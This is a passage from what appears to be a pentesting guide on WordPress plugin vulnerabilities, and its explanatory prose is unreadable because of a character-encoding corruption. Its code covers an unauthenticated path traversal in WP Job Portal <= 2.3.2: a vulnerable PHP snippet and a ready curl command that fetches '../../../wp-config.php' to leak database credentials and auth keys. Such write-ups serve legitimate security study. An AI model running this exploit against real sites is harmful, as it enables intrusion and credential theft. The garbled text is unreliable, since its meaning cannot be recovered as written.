рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд┐рдП рдЧрдП рдкреНрд░рд╢реНрди рдХреЗ рдкрд░рд┐рдгрд╛рдо рдХреЛ рдкреНрд░рдХрдЯ рдХрд░рддреА рд╣реИ рдпрд╛ рдбреЗрдЯрд╛рдмреЗрд╕ рдХреЛ рдмрджрд▓рддреА рд╣реИ, рдЬреЛ SQLi рдХреЛ рд╕рд╛рдмрд┐рдд рдХрд░рддреА рд╣реИред

### рдЕрдкреНрд░рдорд╛рдгрд┐рдд рдордирдорд╛рдирд╛ рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб / рдкрде рдЯреНрд░реИрд╡рд░реНрд╕рд▓ (WP Job Portal <= 2.3.2)

рдПрдХ рдФрд░ рдХрд╛рд░реНрдп, **downloadcustomfile**, рдЖрдЧрдВрддреБрдХреЛрдВ рдХреЛ рдкрде рдЯреНрд░реИрд╡рд░реНрд╕рд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдбрд┐рд╕реНрдХ рдкрд░ рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рдерд╛ред рдХрдордЬреЛрд░ рд╕реНрдерд╛рди `modules/customfield/model.php::downloadCustomUploadedFile()` рдореЗрдВ рд╕реНрдерд┐рдд рд╣реИ:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рд╣реИ рдФрд░ **рд╕рд╛рдл рдХрд┐рдП рдмрд┐рдирд╛** рдЬреЛрдбрд╝рд╛ рдЧрдпрд╛ рд╣реИред рдлрд┐рд░ рд╕реЗ, рдПрдХрдорд╛рддреНрд░ рдЧреЗрдЯ рдПрдХ **CSRF nonce** рд╣реИ рдЬрд┐рд╕реЗ рд░рд┐рдЬрд╝реНрдпреВрдореЗ рдкреГрд╖реНрда рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

#### рд╢реЛрд╖рдг
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
рд╕рд░реНрд╡рд░ `wp-config.php` рдХреА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░рддрд╛ рд╣реИ, DB рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдФрд░ рдСрде рдХреАрдЬрд╝ рд▓реАрдХ рдХрд░рддрд╛ рд╣реИред

## рд╕рдВрджрд░реНрдн

- [Litho Theme рдореЗрдВ рдЕрдирдзрд┐рдХреГрдд рдордирдорд╛рдирд╛ рдлрд╝рд╛рдЗрд▓ рд╣рдЯрд╛рдиреЗ рдХреА рднреЗрджреНрдпрддрд╛](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [WP Job Portal Plugin рдореЗрдВ рдХрдИ рдорд╣рддреНрд╡рдкреВрд░реНрдг рднреЗрджреНрдпрддрд╛рдПрдБ рдкреИрдЪ рдХреА рдЧрдИрдВ](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [ASE Plugin рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдХрд╛ рджреБрд░реНрд▓рдн рдорд╛рдорд▓рд╛ рдЬреЛ 100k+ рд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 рдкрд░рд┐рд╡рд░реНрддрди рд╕реЗрдЯ тАУ рдкреНрд░реЛрдлрд╝рд╛рдЗрд▓ рдЕрдкрдбреЗрдЯ рдкрд░ рдореВрд▓ рднреВрдорд┐рдХрд╛рдПрдБ рд╣рдЯрд╛рдПрдБ](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
